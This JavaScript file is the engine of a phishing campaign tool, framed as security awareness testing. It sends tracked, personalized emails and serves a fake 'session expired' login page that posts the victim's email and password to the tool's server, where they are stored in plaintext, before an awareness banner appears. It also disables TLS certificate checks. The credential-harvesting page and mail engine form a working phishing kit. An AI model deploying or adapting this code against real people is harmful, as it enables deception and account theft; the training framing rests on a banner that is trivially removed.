import nodemailer from 'nodemailer';
import crypto from 'crypto';

// ═══════════════════════════════════════════════════════════
// CAMPAIGN ENGINE — Real Email Delivery, Tracking & Collection
// ═══════════════════════════════════════════════════════════

export class CampaignEngine {
  constructor(db) {
    this.db = db;
    this.smtpConfig = null;
    this.transporter = null;
    this.initDB();
  }

  initDB() {
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS smtp_config (
        id INTEGER PRIMARY KEY DEFAULT 1,
        host TEXT, port INTEGER, secure INTEGER DEFAULT 0,
        user TEXT, pass TEXT, from_name TEXT, from_email TEXT,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      );
      CREATE TABLE IF NOT EXISTS campaigns (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        template_id TEXT,
        subject TEXT,
        body TEXT,
        landing_page_url TEXT,
        status TEXT DEFAULT 'draft',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        launched_at DATETIME,
        completed_at DATETIME
      );
      CREATE TABLE IF NOT EXISTS campaign_targets (
        id TEXT PRIMARY KEY,
        campaign_id TEXT NOT NULL,
        name TEXT,
        email TEXT NOT NULL,
        department TEXT,
        tracking_id TEXT UNIQUE,
        status TEXT DEFAULT 'pending',
        sent_at DATETIME,
        opened_at DATETIME,
        clicked_at DATETIME,
        submitted_at DATETIME,
        FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
      );
      CREATE TABLE IF NOT EXISTS campaign_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        campaign_id TEXT,
        target_id TEXT,
        tracking_id TEXT,
        event_type TEXT,
        ip_address TEXT,
        user_agent TEXT,
        metadata TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      );
      CREATE TABLE IF NOT EXISTS collected_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        campaign_id TEXT,
        target_id TEXT,
        tracking_id TEXT,
        field_name TEXT,
        field_value TEXT,
        ip_address TEXT,
        user_agent TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      );
    `);

    // Load saved SMTP config
    const saved = this.db.prepare('SELECT * FROM smtp_config WHERE id = 1').get();
    if (saved) {
      this.smtpConfig = saved;
      this._createTransporter();
    }
  }

  // ─── SMTP Configuration ──────────────────────────────────

  saveSMTPConfig(config) {
    const { host, port, secure, user, pass, from_name, from_email } = config;
    this.db.prepare(`
      INSERT OR REPLACE INTO smtp_config (id, host, port, secure, user, pass, from_name, from_email, updated_at)
      VALUES (1, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
    `).run(host, port || 587, secure ? 1 : 0, user, pass, from_name || 'OffensiveAI', from_email || user);

    this.smtpConfig = { host, port: port || 587, secure, user, pass, from_name: from_name || 'OffensiveAI', from_email: from_email || user };
    this._createTransporter();
    return { success: true, message: 'SMTP configuration saved' };
  }

  getSMTPConfig() {
    if (!this.smtpConfig) return null;
    return { ...this.smtpConfig, pass: '••••••••' }; // mask password
  }

  _createTransporter() {
    if (!this.smtpConfig) return;
    this.transporter = nodemailer.createTransport({
      host: this.smtpConfig.host,
      port: this.smtpConfig.port,
      secure: this.smtpConfig.secure,
      auth: { user: this.smtpConfig.user, pass: this.smtpConfig.pass },
      tls: { rejectUnauthorized: false },
    });
  }

  async testSMTP() {
    if (!this.transporter) return { success: false, error: 'No SMTP config' };
    try {
      await this.transporter.verify();
      return { success: true, message: 'SMTP connection verified!' };
    } catch (err) {
      return { success: false, error: err.message };
    }
  }

  // ─── Campaign CRUD ───────────────────────────────────────

  createCampaign({ name, subject, body, templateId, landingPageUrl }) {
    const id = crypto.randomUUID();
    this.db.prepare(`
      INSERT INTO campaigns (id, name, template_id, subject, body, landing_page_url) VALUES (?, ?, ?, ?, ?, ?)
    `).run(id, name, templateId || null, subject, body, landingPageUrl || '');
    return { id, name, status: 'draft' };
  }

  listCampaigns() {
    const campaigns = this.db.prepare('SELECT * FROM campaigns ORDER BY created_at DESC').all();
    return campaigns.map(c => {
      const targets = this.db.prepare('SELECT COUNT(*) as count FROM campaign_targets WHERE campaign_id = ?').get(c.id);
      const sent = this.db.prepare("SELECT COUNT(*) as count FROM campaign_targets WHERE campaign_id = ? AND status != 'pending'").get(c.id);
      const opened = this.db.prepare('SELECT COUNT(*) as count FROM campaign_targets WHERE campaign_id = ? AND opened_at IS NOT NULL').get(c.id);
      const clicked = this.db.prepare('SELECT COUNT(*) as count FROM campaign_targets WHERE campaign_id = ? AND clicked_at IS NOT NULL').get(c.id);
      const submitted = this.db.prepare('SELECT COUNT(*) as count FROM campaign_targets WHERE campaign_id = ? AND submitted_at IS NOT NULL').get(c.id);
      return {
        ...c,
        stats: { total: targets.count, sent: sent.count, opened: opened.count, clicked: clicked.count, submitted: submitted.count },
      };
    });
  }

  getCampaign(id) {
    const campaign = this.db.prepare('SELECT * FROM campaigns WHERE id = ?').get(id);
    if (!campaign) return null;
    const targets = this.db.prepare('SELECT * FROM campaign_targets WHERE campaign_id = ? ORDER BY email').all(id);
    const events = this.db.prepare('SELECT * FROM campaign_events WHERE campaign_id = ? ORDER BY created_at DESC LIMIT 100').all(id);
    const data = this.db.prepare('SELECT * FROM collected_data WHERE campaign_id = ? ORDER BY created_at DESC').all(id);
    return { ...campaign, targets, events, collectedData: data };
  }

  deleteCampaign(id) {
    this.db.prepare('DELETE FROM collected_data WHERE campaign_id = ?').run(id);
    this.db.prepare('DELETE FROM campaign_events WHERE campaign_id = ?').run(id);
    this.db.prepare('DELETE FROM campaign_targets WHERE campaign_id = ?').run(id);
    this.db.prepare('DELETE FROM campaigns WHERE id = ?').run(id);
    return { success: true };
  }

  // ─── Target Management ───────────────────────────────────

  addTargets(campaignId, targets) {
    const stmt = this.db.prepare(`
      INSERT INTO campaign_targets (id, campaign_id, name, email, department, tracking_id) VALUES (?, ?, ?, ?, ?, ?)
    `);
    const added = [];
    for (const t of targets) {
      const id = crypto.randomUUID();
      const trackingId = crypto.randomBytes(16).toString('hex');
      stmt.run(id, campaignId, t.name || '', t.email, t.department || '', trackingId);
      added.push({ id, email: t.email, trackingId });
    }
    return { added: added.length, targets: added };
  }

  removeTarget(targetId) {
    this.db.prepare('DELETE FROM campaign_targets WHERE id = ?').run(targetId);
    return { success: true };
  }

  // ─── Launch Campaign ─────────────────────────────────────

  async launchCampaign(campaignId, serverBaseUrl) {
    const campaign = this.db.prepare('SELECT * FROM campaigns WHERE id = ?').get(campaignId);
    if (!campaign) return { success: false, error: 'Campaign not found' };
    if (!this.transporter) return { success: false, error: 'SMTP not configured' };

    const targets = this.db.prepare("SELECT * FROM campaign_targets WHERE campaign_id = ? AND status = 'pending'").all(campaignId);
    if (targets.length === 0) return { success: false, error: 'No pending targets' };

    // Update status
    this.db.prepare("UPDATE campaigns SET status = 'active', launched_at = CURRENT_TIMESTAMP WHERE id = ?").run(campaignId);

    const results = { sent: 0, failed: 0, errors: [] };

    for (const target of targets) {
      try {
        const trackingPixel = `${serverBaseUrl}/track/${target.tracking_id}/open`;
        const clickUrl = `${serverBaseUrl}/phish/${target.tracking_id}`;

        // Personalize email body
        let personalizedBody = campaign.body
          .replace(/\{\{name\}\}/gi, target.name || 'User')
          .replace(/\{\{email\}\}/gi, target.email)
          .replace(/\{\{department\}\}/gi, target.department || 'General')
          .replace(/\{\{tracking_url\}\}/gi, clickUrl)
          .replace(/\{\{company\}\}/gi, 'Organization')
          // Auto-replace any hardcoded phishing page links with tracked URL
          .replace(/http:\/\/localhost:3001\/phish\/microsoft[^"']*/gi, clickUrl)
          .replace(/http:\/\/localhost:3001\/phish\/google[^"']*/gi, clickUrl)
          .replace(/http:\/\/localhost:3001\/phish\/[^"'\s]*/gi, clickUrl);

        let personalizedSubject = campaign.subject
          .replace(/\{\{name\}\}/gi, target.name || 'User');

        // Build HTML email with tracking pixel
        const htmlBody = `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
            ${personalizedBody.replace(/\n/g, '<br/>')}
            <img src="${trackingPixel}" width="1" height="1" style="display:none" alt="" />
          </div>
        `;

        await this.transporter.sendMail({
          from: `"${this.smtpConfig.from_name}" <${this.smtpConfig.from_email}>`,
          to: target.email,
          subject: personalizedSubject,
          html: htmlBody,
          text: personalizedBody,
        });

        this.db.prepare("UPDATE campaign_targets SET status = 'sent', sent_at = CURRENT_TIMESTAMP WHERE id = ?").run(target.id);
        this._logEvent(campaignId, target.id, target.tracking_id, 'sent', '', '');
        results.sent++;

        // Small delay between sends
        await new Promise(r => setTimeout(r, 500));
      } catch (err) {
        results.failed++;
        results.errors.push({ email: target.email, error: err.message });
        this.db.prepare("UPDATE campaign_targets SET status = 'failed' WHERE id = ?").run(target.id);
        this._logEvent(campaignId, target.id, target.tracking_id, 'send_failed', '', '', JSON.stringify({ error: err.message }));
      }
    }

    if (results.failed === targets.length) {
      this.db.prepare("UPDATE campaigns SET status = 'failed' WHERE id = ?").run(campaignId);
    }

    return { success: true, ...results };
  }

  // ─── Tracking ────────────────────────────────────────────

  recordOpen(trackingId, ip, ua) {
    const target = this.db.prepare('SELECT * FROM campaign_targets WHERE tracking_id = ?').get(trackingId);
    if (!target) return null;
    if (!target.opened_at) {
      this.db.prepare('UPDATE campaign_targets SET opened_at = CURRENT_TIMESTAMP WHERE tracking_id = ?').run(trackingId);
    }
    this._logEvent(target.campaign_id, target.id, trackingId, 'opened', ip, ua);
    return target;
  }

  recordClick(trackingId, ip, ua) {
    const target = this.db.prepare('SELECT * FROM campaign_targets WHERE tracking_id = ?').get(trackingId);
    if (!target) return null;
    if (!target.clicked_at) {
      this.db.prepare('UPDATE campaign_targets SET clicked_at = CURRENT_TIMESTAMP WHERE tracking_id = ?').run(trackingId);
    }
    this._logEvent(target.campaign_id, target.id, trackingId, 'clicked', ip, ua);
    return target;
  }

  recordSubmission(trackingId, formData, ip, ua) {
    const target = this.db.prepare('SELECT * FROM campaign_targets WHERE tracking_id = ?').get(trackingId);
    if (!target) return null;
    if (!target.submitted_at) {
      this.db.prepare('UPDATE campaign_targets SET submitted_at = CURRENT_TIMESTAMP WHERE tracking_id = ?').run(trackingId);
    }
    // Store each field
    const stmt = this.db.prepare('INSERT INTO collected_data (campaign_id, target_id, tracking_id, field_name, field_value, ip_address, user_agent) VALUES (?, ?, ?, ?, ?, ?, ?)');
    for (const [key, value] of Object.entries(formData)) {
      stmt.run(target.campaign_id, target.id, trackingId, key, String(value), ip, ua);
    }
    this._logEvent(target.campaign_id, target.id, trackingId, 'submitted', ip, ua, JSON.stringify(formData));
    return target;
  }

  getTargetByTracking(trackingId) {
    return this.db.prepare(`
      SELECT ct.*, c.name as campaign_name, c.landing_page_url, c.body
      FROM campaign_targets ct JOIN campaigns c ON ct.campaign_id = c.id
      WHERE ct.tracking_id = ?
    `).get(trackingId);
  }

  _logEvent(campaignId, targetId, trackingId, type, ip, ua, metadata = '') {
    this.db.prepare(`
      INSERT INTO campaign_events (campaign_id, target_id, tracking_id, event_type, ip_address, user_agent, metadata)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `).run(campaignId, targetId, trackingId, type, ip || '', ua || '', metadata);
  }

  // ─── Landing Page HTML ───────────────────────────────────

  generateLandingPage(trackingId, target, serverBaseUrl) {
    const campaign = this.db.prepare('SELECT * FROM campaigns WHERE id = ?').get(target.campaign_id);
    return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Login Required</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
    .container { background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 40px; width: 420px; max-width: 95%; }
    .logo { text-align: center; margin-bottom: 24px; font-size: 2rem; }
    h2 { font-size: 1.2rem; font-weight: 600; margin-bottom: 8px; color: #1a1a1a; text-align: center; }
    .subtitle { color: #666; font-size: 0.85rem; text-align: center; margin-bottom: 24px; }
    .form-group { margin-bottom: 16px; }
    label { display: block; font-size: 0.82rem; font-weight: 500; margin-bottom: 6px; color: #333; }
    input { width: 100%; padding: 12px 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 0.9rem; outline: none; transition: border 0.2s; }
    input:focus { border-color: #0066ff; box-shadow: 0 0 0 3px rgba(0,102,255,0.1); }
    .btn { width: 100%; padding: 12px; background: #0066ff; color: white; border: none; border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: background 0.2s; }
    .btn:hover { background: #0052cc; }
    .success { display: none; text-align: center; padding: 30px; }
    .success .check { font-size: 3rem; margin-bottom: 12px; }
    .success h3 { color: #1a1a1a; margin-bottom: 8px; }
    .warning-banner { display: none; background: #fff3e0; border: 2px solid #ff9800; border-radius: 8px; padding: 16px; margin-top: 20px; text-align: center; }
    .warning-banner h4 { color: #e65100; margin-bottom: 8px; }
    .warning-banner p { color: #666; font-size: 0.82rem; line-height: 1.5; }
  </style>
</head>
<body>
  <div class="container">
    <div id="form-section">
      <div class="logo">🔒</div>
      <h2>Verify Your Identity</h2>
      <p class="subtitle">Your session has expired. Please re-enter your credentials to continue.</p>
      <form id="phish-form" onsubmit="return submitForm(event)">
        <div class="form-group">
          <label>Email Address</label>
          <input type="email" name="email" id="email" value="${target.email || ''}" required>
        </div>
        <div class="form-group">
          <label>Password</label>
          <input type="password" name="password" id="password" placeholder="Enter your password" required>
        </div>
        <button type="submit" class="btn">Sign In</button>
      </form>
    </div>
    <div id="success-section" class="success">
      <div class="check">✅</div>
      <h3>Verification Complete</h3>
      <p style="color:#666; font-size:0.85rem;">Your session has been restored.</p>
    </div>
    <div id="warning-banner" class="warning-banner">
      <h4>⚠️ This Was a Security Awareness Test</h4>
      <p>This page is part of <strong>${campaign?.name || 'a security awareness campaign'}</strong>. 
      In a real attack, submitting your credentials here would have compromised your account. 
      Never enter passwords on pages you did not navigate to directly.
      </p>
    </div>
  </div>
  <script>
    function submitForm(e) {
      e.preventDefault();
      const data = { email: document.getElementById('email').value, password: document.getElementById('password').value };
      fetch('${serverBaseUrl}/collect/${trackingId}', {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data)
      }).catch(() => {});
      document.getElementById('form-section').style.display = 'none';
      document.getElementById('success-section').style.display = 'block';
      setTimeout(() => { document.getElementById('warning-banner').style.display = 'block'; }, 3000);
      return false;
    }
  </script>
</body>
</html>`;
  }

  // ─── Stats ───────────────────────────────────────────────

  getCampaignStats(campaignId) {
    const campaign = this.db.prepare('SELECT * FROM campaigns WHERE id = ?').get(campaignId);
    if (!campaign) return null;
    const total = this.db.prepare('SELECT COUNT(*) as c FROM campaign_targets WHERE campaign_id = ?').get(campaignId).c;
    const sent = this.db.prepare("SELECT COUNT(*) as c FROM campaign_targets WHERE campaign_id = ? AND status != 'pending'").get(campaignId).c;
    const opened = this.db.prepare('SELECT COUNT(*) as c FROM campaign_targets WHERE campaign_id = ? AND opened_at IS NOT NULL').get(campaignId).c;
    const clicked = this.db.prepare('SELECT COUNT(*) as c FROM campaign_targets WHERE campaign_id = ? AND clicked_at IS NOT NULL').get(campaignId).c;
    const submitted = this.db.prepare('SELECT COUNT(*) as c FROM campaign_targets WHERE campaign_id = ? AND submitted_at IS NOT NULL').get(campaignId).c;
    const events = this.db.prepare('SELECT * FROM campaign_events WHERE campaign_id = ? ORDER BY created_at DESC LIMIT 50').all(campaignId);
    const data = this.db.prepare('SELECT * FROM collected_data WHERE campaign_id = ? ORDER BY created_at DESC').all(campaignId);
    return {
      ...campaign,
      stats: {
        total, sent, opened, clicked, submitted,
        openRate: total ? Math.round((opened / total) * 100) : 0,
        clickRate: total ? Math.round((clicked / total) * 100) : 0,
        submitRate: total ? Math.round((submitted / total) * 100) : 0
      },
      recentEvents: events,
      collectedData: data,
    };
  }
}
